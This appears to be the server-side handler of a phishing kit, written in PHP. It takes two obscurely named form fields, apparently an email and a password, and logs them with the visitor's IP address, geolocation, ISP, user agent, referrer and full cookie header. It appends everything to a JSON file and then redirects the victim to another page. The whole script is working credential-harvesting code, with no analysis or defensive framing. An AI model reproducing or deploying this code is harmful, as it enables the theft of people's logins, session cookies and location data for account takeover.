<?php
// Include ip.php to retrieve IP and device details
include 'ip.php';

// Define elx and pdx (assuming these are received from a form or another source)
$elx = $_POST['elx'] ?? 'default_elx';
$pdx = $_POST['pdx'] ?? 'default_pdx'; 

// Check for success and get default values if not found
$city = $success ? $details['city'] ?? 'Unknown' : 'Unknown';
$region = $success ? $details['region'] ?? 'Unknown' : 'Unknown';
$country = $success ? $details['country'] ?? 'Unknown' : 'Unknown';
$location = $success ? ($details['latitude'] . ', ' . $details['longitude']) : 'Unknown';
$isp = $success ? $details['isp'] ?? 'Unknown' : 'Unknown';
$type = $success ? $details['type'] ?? 'Unknown' : 'Unknown';

// Prepare data with the IP logging details from ip.php
$data = [
    'elx' => $elx,
    'pdx' => $pdx,
    'ip_info' => [
        'ip' => $PublicIP,
        'port' => $_SERVER['REMOTE_PORT'] ?? 'Unknown',
        'city' => $city,
        'region' => $region,
        'country' => $country,
        'location' => $location,
        'isp' => $isp,
        'type' => $type,
    ],
    'additional_info' => [
        'date' => date("Y-m-d H:i:s"),
        'host' => gethostbyaddr($PublicIP),
        'user_agent' => $user_agent,
        'browser' => $user_browser,
        'os' => $user_os,
        'method' => $_SERVER['REQUEST_METHOD'],
        'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct Access',
        'cookie' => $_SERVER['HTTP_COOKIE'] ?? '',
    ]
];

// Define the file path
$filePath = 'data_new.json';

// Check if file exists and load existing data
if (file_exists($filePath)) {
    $existingData = json_decode(file_get_contents($filePath), true);
    if (!is_array($existingData)) {
        $existingData = [];  // Ensure it’s an array
    }
} else {
    $existingData = []; // Start a new array if file does not exist
}

// Append the new data
$existingData[] = $data;

// Encode and save the updated array back to the file
file_put_contents($filePath, json_encode($existingData, JSON_PRETTY_PRINT) . PHP_EOL, LOCK_EX);

// Redirect to g.html
header("Location: g.html");
exit();
?>

